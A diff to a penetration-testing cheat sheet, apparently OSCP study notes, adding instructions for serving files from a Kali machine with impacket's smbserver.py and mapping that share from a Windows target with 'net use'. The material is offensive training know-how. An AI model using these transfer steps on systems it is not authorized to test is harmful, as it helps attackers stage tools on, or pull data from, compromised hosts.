@@ -105,6 +105,11 @@ Get files from SMB share:
 - `use <share>` --> use share xyz   
 - `get <file>` --> download file  
 
+Transfer files from the Kali VM with smbserver.py:
+- `python /usr/lib/python2.7/dist-packages/impacket/smbserver.py -smb2support share /root/Desktop/OSCP/SMB/SMBServer/`  
+- on the Windows target, get the connection to the share with e.g.: `net use x: \\<kali-ip>\share`  
+
+
 ## WinRM
 - WinRM from Linux: https://github.com/Hackplayers/evil-winrm
 
